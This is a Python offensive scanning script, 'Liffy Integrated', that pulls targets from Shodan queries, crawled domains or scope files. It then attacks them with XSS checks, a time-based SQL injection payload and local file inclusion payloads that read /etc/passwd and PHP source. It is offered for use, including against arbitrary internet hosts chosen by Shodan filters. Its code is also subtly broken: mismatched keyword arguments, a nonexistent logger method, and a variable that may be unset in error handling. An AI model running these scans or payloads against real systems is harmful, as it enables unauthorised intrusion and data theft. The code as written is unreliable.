#!/usr/bin/env python3
"""
Liffy Integrated - Complete Integration of All Tools
sqry + gauplus + jeeves + airixss + qsreplace + httpx
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__version__ = '5.0.0'

import argparse
import sys
import os
import time
import json
import random
import subprocess
import threading
import tempfile
import shutil
from pathlib import Path
from typing import List, Dict, Optional, Any, Tuple
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, quote_plus
import base64

try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

class IntegratedToolManager:
    """Manages all integrated tools"""
    
    def __init__(self, logger):
        self.logger = logger
        self.tools = {
            'sqry': 'sqry',
            'gauplus': 'gauplus', 
            'jeeves': 'jeeves',
            'airixss': 'airixss',
            'qsreplace': 'qsreplace',
            'httpx': 'httpx'
        }
        self.tool_status = {}
        self._check_tools()
    
    def _check_tools(self):
        """Check tool availability"""
        for tool_name, tool_path in self.tools.items():
            try:
                if tool_name == 'sqry':
                    result = subprocess.run([tool_path, '-help'], capture_output=True, text=True, timeout=5)
                elif tool_name == 'gauplus':
                    result = subprocess.run([tool_path, '-help'], capture_output=True, text=True, timeout=5)
                elif tool_name == 'jeeves':
                    result = subprocess.run([tool_path, '-h'], capture_output=True, text=True, timeout=5)
                elif tool_name == 'airixss':
                    result = subprocess.run([tool_path, '-h'], capture_output=True, text=True, timeout=5)
                else:
                    result = subprocess.run([tool_path, '--help'], capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0 or 'help' in result.stderr.lower() or 'usage' in result.stdout.lower():
                    self.tool_status[tool_name] = True
                    self.logger.info(f"✓ {tool_name} is available")
                else:
                    self.tool_status[tool_name] = False
                    self.logger.warning(f"✗ {tool_name} not found")
            except Exception as e:
                self.tool_status[tool_name] = False
                self.logger.error(f"✗ Error checking {tool_name}: {str(e)}")
    
    def is_available(self, tool_name: str) -> bool:
        return self.tool_status.get(tool_name, False)
    
    def execute(self, tool_name: str, args: List[str], input_data: str = None, timeout: int = 60) -> Tuple[bool, str, str]:
        """Execute a tool"""
        if not self.is_available(tool_name):
            return False, "", f"Tool {tool_name} not available"
        
        tool_path = self.tools[tool_name]
        cmd = [tool_path] + args
        
        try:
            if input_data:
                result = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=timeout)
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            
            return result.returncode == 0, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return False, "", f"Tool {tool_name} timed out"
        except Exception as e:
            return False, "", f"Error running {tool_name}: {str(e)}"

class TargetGatherer:
    """Gathers targets from multiple sources"""
    
    def __init__(self, tool_manager: IntegratedToolManager, logger):
        self.tool_manager = tool_manager
        self.logger = logger
    
    def gather_from_shodan(self, query: str, limit: int = 100, country: str = None, asn: str = None) -> List[str]:
        """Gather targets from Shodan using sqry"""
        if not self.tool_manager.is_available('sqry'):
            self.logger.error("sqry not available")
            return []
        
        self.logger.info(f"🔍 Gathering targets from Shodan: {query}")
        
        args = ['-q', query, '--json', '--limit', str(limit)]
        if country:
            args.extend(['--country', country])
        if asn:
            args.extend(['--asn', asn])
        
        success, stdout, stderr = self.tool_manager.execute('sqry', args)
        
        if not success:
            self.logger.error(f"sqry failed: {stderr}")
            return []
        
        targets = []
        for line in stdout.strip().split('\n'):
            if line.strip():
                try:
                    data = json.loads(line)
                    ip = data.get('ip', '')
                    port = data.get('port', 80)
                    protocol = 'https' if port in [443, 8443] else 'http'
                    url = f"{protocol}://{ip}:{port}"
                    targets.append(url)
                except:
                    continue
        
        self.logger.info(f"✓ Found {len(targets)} targets from Shodan")
        return targets
    
    def gather_from_gauplus(self, domain: str, subs: bool = True) -> List[str]:
        """Gather URLs using gauplus"""
        if not self.tool_manager.is_available('gauplus'):
            self.logger.error("gauplus not available")
            return []
        
        self.logger.info(f"🕷️ Crawling domain: {domain}")
        
        args = ['-t', '10']
        if subs:
            args.append('-subs')
        
        success, stdout, stderr = self.tool_manager.execute('gauplus', args, input=domain)
        
        if not success:
            self.logger.error(f"gauplus failed: {stderr}")
            return []
        
        targets = []
        for line in stdout.strip().split('\n'):
            if line.strip() and line.startswith('http'):
                targets.append(line.strip())
        
        self.logger.info(f"✓ Found {len(targets)} URLs from gauplus")
        return targets
    
    def gather_from_scope(self, scope_dir: str = "~/targets/scope", count: int = 10) -> List[str]:
        """Gather random targets from scope"""
        scope_path = Path(scope_dir).expanduser()
        
        if not scope_path.exists():
            self.logger.error(f"Scope directory not found: {scope_path}")
            return []
        
        scope_files = []
        for ext in ['*.txt', '*.md', '*.json', '*.csv']:
            scope_files.extend(scope_path.glob(ext))
        
        if not scope_files:
            self.logger.error(f"No scope files found in {scope_path}")
            return []
        
        targets = []
        for file_path in scope_files:
            try:
                with open(file_path, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and (line.startswith('http') or line.startswith('www')):
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            targets.append(line)
            except Exception as e:
                self.logger.warning(f"Error reading {file_path}: {str(e)}")
        
        selected = random.sample(targets, min(count, len(targets)))
        self.logger.info(f"✓ Selected {len(selected)} random targets from scope")
        return selected

class VulnerabilityTester:
    """Tests for various vulnerabilities"""
    
    def __init__(self, tool_manager: IntegratedToolManager, logger):
        self.tool_manager = tool_manager
        self.logger = logger
    
    def test_xss(self, targets: List[str]) -> List[Dict]:
        """Test for XSS using airixss"""
        if not self.tool_manager.is_available('airixss'):
            self.logger.warning("airixss not available, skipping XSS tests")
            return []
        
        self.logger.info(f"🎯 Testing {len(targets)} targets for XSS vulnerabilities")
        
        # Create temporary file with URLs
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
            for target in targets:
                f.write(f"{target}\n")
            url_file = f.name
        
        try:
            args = ['-c', '20', '-s']
            success, stdout, stderr = self.tool_manager.execute('airixss', args, 
                                                              input=open(url_file).read())
            
            results = []
            if success:
                vulnerable_urls = set()
                for line in stdout.strip().split('\n'):
                    if line.strip() and line.startswith('http'):
                        vulnerable_urls.add(line.strip())
                
                for target in targets:
                    if target in vulnerable_urls:
                        results.append({
                            'url': target,
                            'vulnerability': 'XSS',
                            'status': 'vulnerable'
                        })
                        self.logger.success(f"🎯 XSS found: {target}")
            
            return results
            
        finally:
            os.unlink(url_file)
    
    def test_sqli(self, targets: List[str]) -> List[Dict]:
        """Test for SQL injection using jeeves"""
        if not self.tool_manager.is_available('jeeves'):
            self.logger.warning("jeeves not available, skipping SQLi tests")
            return []
        
        self.logger.info(f"💉 Testing {len(targets)} targets for SQL injection")
        
        results = []
        for target in targets:
            try:
                # Extract parameters
                parsed = urlparse(target)
                params = parse_qs(parsed.query)
                
                if not params:
                    continue
                
                # Test each parameter
                for param, values in params.items():
                    if not values:
                        continue
                    
                    # Create time-based payload
                    payload = "(select(0)from(select(sleep(5)))v)"
                    test_url = target.replace(values[0], payload)
                    
                    # Test with jeeves
                    args = ['-t', '5']
                    success, stdout, stderr = self.tool_manager.execute('jeeves', args, 
                                                                      input=test_url)
                    
                    if success and ("vulnerable" in stdout.lower() or "injection" in stdout.lower()):
                        results.append({
                            'url': target,
                            'vulnerability': 'SQLi',
                            'parameter': param,
                            'payload': payload,
                            'status': 'vulnerable'
                        })
                        self.logger.success(f"💉 SQLi found: {target} (param: {param})")
                        break
                        
            except Exception as e:
                self.logger.error(f"Error testing SQLi for {target}: {str(e)}")
        
        return results
    
    def test_lfi(self, targets: List[str]) -> List[Dict]:
        """Test for LFI vulnerabilities"""
        self.logger.info(f"🔓 Testing {len(targets)} targets for LFI vulnerabilities")
        
        results = []
        lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd"
        ]
        
        for target in targets:
            try:
                parsed = urlparse(target)
                params = parse_qs(parsed.query)
                
                # Look for common LFI parameters
                lfi_params = ['file', 'page', 'path', 'include', 'doc', 'folder', 'root', 'dir']
                
                for param in lfi_params:
                    if param in params:
                        for payload in lfi_payloads:
                            test_url = target.replace(params[param][0], payload)
                            
                            # Basic check
                            try:
                                import requests
                                response = requests.get(test_url, timeout=10)
                                
                                if ("root:" in response.text and "bin/bash" in response.text) or \
                                   ("localhost" in response.text and "127.0.0.1" in response.text) or \
                                   ("<?php" in response.text and "base64" in response.text):
                                    
                                    results.append({
                                        'url': target,
                                        'vulnerability': 'LFI',
                                        'parameter': param,
                                        'payload': payload,
                                        'status': 'vulnerable'
                                    })
                                    self.logger.success(f"🔓 LFI found: {target} (param: {param})")
                                    break
                            except:
                                continue
                        break
                        
            except Exception as e:
                self.logger.error(f"Error testing LFI for {target}: {str(e)}")
        
        return results

class LiffyIntegrated:
    """Main integrated Liffy class"""
    
    def __init__(self):
        self.logger = self._setup_logging()
        self.tool_manager = IntegratedToolManager(self.logger)
        self.gatherer = TargetGatherer(self.tool_manager, self.logger)
        self.tester = VulnerabilityTester(self.tool_manager, self.logger)
    
    def _setup_logging(self):
        """Setup logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler('liffy_integrated.log')
            ]
        )
        return logging.getLogger(__name__)
    
    def banner(self):
        """Display banner"""
        print(t.cyan("""
    .____    .__  _____  _____
    |    |   |__|/ ____\\/ ____\\__.__.
    |    |   |  \\   __\\   __<   |  |
    |    |___|  ||  |   |  |  \\___  |
    |_______ \\__||__|   |__|  / ____| v5.0 Integrated
        \\/                \\/

    🚀 Ultimate All-in-One Vulnerability Testing Tool
    🔍 LFI | XSS | SQLi | Discovery | Shodan | Crawling
    🛠️  Integrated: sqry | gauplus | jeeves | airixss | qsreplace | httpx
    ⚡ No API Keys Required | Multi-threaded | Comprehensive
        """))
    
    def run_comprehensive_test(self, args):
        """Run comprehensive vulnerability testing"""
        self.banner()
        
        # Gather targets
        targets = []
        
        if args.shodan_query:
            shodan_targets = self.gatherer.gather_from_shodan(
                args.shodan_query,
                limit=args.limit,
                country=args.country,
                asn=args.asn
            )
            targets.extend(shodan_targets)
        
        if args.domain:
            domain_targets = self.gatherer.gather_from_gauplus(
                args.domain,
                subs=args.subs
            )
            targets.extend(domain_targets)
        
        if args.random or not targets:
            scope_targets = self.gatherer.gather_from_scope(
                args.scope_dir,
                args.random_count
            )
            targets.extend(scope_targets)
        
        # Remove duplicates
        unique_targets = list(set(targets))
        self.logger.info(f"🎯 Total unique targets: {len(unique_targets)}")
        
        if not unique_targets:
            self.logger.error("No targets found")
            return []
        
        # Test vulnerabilities
        all_results = []
        
        if args.test_mode in ['xss', 'all']:
            xss_results = self.tester.test_xss(unique_targets)
            all_results.extend(xss_results)
        
        if args.test_mode in ['sqli', 'all']:
            sqli_results = self.tester.test_sqli(unique_targets)
            all_results.extend(sqli_results)
        
        if args.test_mode in ['lfi', 'all']:
            lfi_results = self.tester.test_lfi(unique_targets)
            all_results.extend(lfi_results)
        
        # Show results
        self._show_results(all_results)
        
        # Save results
        if args.output:
            self._save_results(all_results, args.output)
        
        return all_results
    
    def _show_results(self, results: List[Dict]):
        """Display results"""
        if not results:
            print(t.yellow("⚠️ No vulnerabilities found"))
            return
        
        print(t.cyan("\n" + "="*80))
        print(t.cyan("🎯 VULNERABILITY TEST RESULTS"))
        print(t.cyan("="*80))
        
        vuln_types = {}
        for result in results:
            vuln_type = result['vulnerability']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = []
            vuln_types[vuln_type].append(result)
        
        for vuln_type, vulns in vuln_types.items():
            print(t.yellow(f"\n🔍 {vuln_type} Vulnerabilities ({len(vulns)}):"))
            for vuln in vulns:
                if vuln_type == 'XSS':
                    print(f"  {vuln['url']}")
                else:
                    print(f"  {vuln['url']} (param: {vuln.get('parameter', 'N/A')})")
                    if 'payload' in vuln:
                        print(f"    Payload: {vuln['payload']}")
    
    def _save_results(self, results: List[Dict], output_file: str):
        """Save results to file"""
        try:
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)
            self.logger.info(f"💾 Results saved to {output_file}")
        except Exception as e:
            self.logger.error(f"Error saving results: {str(e)}")

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Liffy Integrated - Complete Vulnerability Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Shodan discovery + XSS testing
  %(prog)s --shodan-query "apache" --test-mode xss --limit 50
  
  # Domain crawling + comprehensive testing
  %(prog)s --domain example.com --test-mode all --subs
  
  # Random scope targets + LFI testing
  %(prog)s --random --test-mode lfi --random-count 20
  
  # Shodan + SQLi testing with country filter
  %(prog)s --shodan-query "nginx" --test-mode sqli --country US --limit 100
        """
    )
    
    # Target selection
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument("--domain", help="Target domain for crawling")
    target_group.add_argument("--shodan-query", help="Shodan query for target discovery")
    target_group.add_argument("--random", action="store_true", help="Use random targets from scope")
    
    # Options
    parser.add_argument("--scope-dir", default="~/targets/scope", help="Scope directory path")
    parser.add_argument("--random-count", type=int, default=10, help="Number of random targets")
    parser.add_argument("--subs", action="store_true", help="Include subdomains in crawling")
    parser.add_argument("--country", help="Filter by country code")
    parser.add_argument("--asn", help="Filter by ASN")
    parser.add_argument("--limit", type=int, default=100, help="Limit number of results")
    
    # Testing
    parser.add_argument("--test-mode", choices=['lfi', 'xss', 'sqli', 'all'], default='all',
                       help="Type of testing to perform")
    
    # Output
    parser.add_argument("--output", "-o", help="Output file for results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    return parser.parse_args()

def main():
    """Main function"""
    try:
        args = parse_arguments()
        
        liffy = LiffyIntegrated()
        results = liffy.run_comprehensive_test(args)
        
        if results:
            print(t.green(f"\n✅ Testing completed! Found {len(results)} vulnerabilities"))
        else:
            print(t.yellow("\n⚠️ No vulnerabilities found"))
            
    except KeyboardInterrupt:
        print(t.red("\n🛑 Keyboard interrupt received"))
        sys.exit(0)
    except Exception as e:
        print(t.red(f"\n💥 Unexpected error: {str(e)}"))
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()